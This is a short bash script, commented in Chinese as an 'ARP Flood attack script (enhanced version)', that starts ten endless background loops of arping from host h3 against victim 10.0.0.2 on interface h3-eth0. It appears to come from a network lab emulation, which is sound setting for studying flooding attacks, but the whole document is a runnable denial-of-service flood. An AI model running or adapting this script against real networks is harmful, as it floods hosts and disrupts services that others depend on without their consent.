#!/bin/bash
# ARP Flood 攻擊腳本（加強版）
# 從 h3 對 h2 發動大量 ARP 封包

VICTIM_IP="10.0.0.2"
IFACE="h3-eth0"

echo "[*] Starting HEAVY ARP flood against ${VICTIM_IP} on interface ${IFACE} ..."
echo "    Press Ctrl+C to stop."

# 同時啟動多個 arping 程序來增加封包數量
for i in {1..10}; do
    while true; do
        arping -c 20 -w 1 -I "$IFACE" "$VICTIM_IP" > /dev/null 2>&1
    done &
done

# 等待所有背景程序
wait
